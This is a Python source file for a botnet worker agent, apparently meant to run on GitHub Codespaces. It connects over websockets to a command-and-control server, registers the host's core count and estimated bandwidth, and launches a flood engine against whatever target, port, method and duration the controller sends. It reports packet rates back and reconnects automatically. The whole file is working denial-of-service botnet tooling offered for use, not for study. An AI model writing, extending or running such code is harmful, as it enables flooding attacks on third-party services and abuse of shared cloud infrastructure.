"""
Worker agent — connects to C2, executes flood commands.
Runs on each Codespace.
"""
import asyncio
import json
import os
import platform
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path

import websockets

C2_URL = os.environ.get("C2_URL", "ws://localhost:9000/ws/worker")
WORKER_ID = os.environ.get("WORKER_ID") or f"cs_{platform.node()[:8]}"
ENGINE = Path(__file__).parent / "engine" / "flood_engine"

current_proc: subprocess.Popen | None = None
current_attack_id: str | None = None


def detect_info():
    cores = os.cpu_count() or 2
    # rough bandwidth class
    bw = {2: 500, 4: 800, 8: 1500, 16: 2500, 32: 4000}.get(cores, 500)
    return {
        "host": platform.node(),
        "os": platform.system(),
        "cores": cores,
        "bandwidth_mbps_estimate": bw,
    }


async def parse_stats(proc: subprocess.Popen, ws):
    """Read engine stdout, parse [stats] lines, forward to C2."""
    while True:
        line = await proc.stdout.readline()
        if not line:
            break
        text = line.decode(errors="replace").strip()
        print(f"[engine] {text}")

        if "[stats]" in text:
            # [stats] pps=X bps=Y total_p=... total_b=...
            parts = {}
            for tok in text.split("[stats]")[1].split():
                if "=" in tok:
                    k, v = tok.split("=", 1)
                    try:
                        parts[k] = int(v)
                    except ValueError:
                        pass
            try:
                await ws.send(json.dumps({
                    "type": "stats",
                    "pps": parts.get("pps", 0),
                    "bps": parts.get("bps", 0),
                }))
            except Exception:
                pass


async def run_attack(cmd: dict, ws):
    global current_proc, current_attack_id

    if current_proc and current_proc.poll() is None:
        await stop_attack(ws)

    args = [
        str(ENGINE),
        "-target", cmd["target"],
        "-port", str(cmd["port"]),
        "-method", cmd["method"],
        "-duration", str(cmd["duration"]),
        "-threads", str(cmd["threads"]),
    ]
    print(f"[+] starting: {' '.join(args)}")

    current_proc = await asyncio.create_subprocess_exec(
        *args,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.STDOUT,
    )
    current_attack_id = cmd["id"]

    await asyncio.gather(
        parse_stats(current_proc, ws),
        current_proc.wait(),
    )

    try:
        await ws.send(json.dumps({"type": "done", "id": current_attack_id}))
    except Exception:
        pass

    current_proc = None
    current_attack_id = None


async def stop_attack(ws=None):
    global current_proc, current_attack_id
    if current_proc and current_proc.poll() is None:
        print("[*] stopping attack")
        try:
            current_proc.terminate()
            try:
                await asyncio.wait_for(current_proc.wait(), timeout=5)
            except asyncio.TimeoutError:
                current_proc.kill()
        except Exception:
            pass
    current_proc = None
    current_attack_id = None


async def heartbeat(ws):
    """Ping every 30s so C2 knows we're alive."""
    while True:
        await asyncio.sleep(30)
        try:
            await ws.send(json.dumps({"type": "ping"}))
        except Exception:
            return


async def main():
    info = detect_info()
    print(f"[*] worker id = {WORKER_ID}")
    print(f"[*] info = {info}")
    print(f"[*] connecting to {C2_URL}")

    while True:
        try:
            async with websockets.connect(C2_URL, ping_interval=20,
                                          ping_timeout=30,
                                          max_size=2**20) as ws:
                await ws.send(json.dumps({
                    "type": "hello",
                    "id": WORKER_ID,
                    "info": info,
                }))
                welcome = await ws.recv()
                print(f"[+] {welcome}")

                hb = asyncio.create_task(heartbeat(ws))

                async for raw in ws:
                    try:
                        msg = json.loads(raw)
                    except Exception:
                        continue
                    cmd = msg.get("cmd")
                    if cmd == "attack":
                        asyncio.create_task(run_attack(msg, ws))
                    elif cmd == "stop":
                        await stop_attack(ws)

                hb.cancel()
        except Exception as e:
            print(f"[!] connection lost: {e} — retry in 5s")
            await asyncio.sleep(5)


if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        pass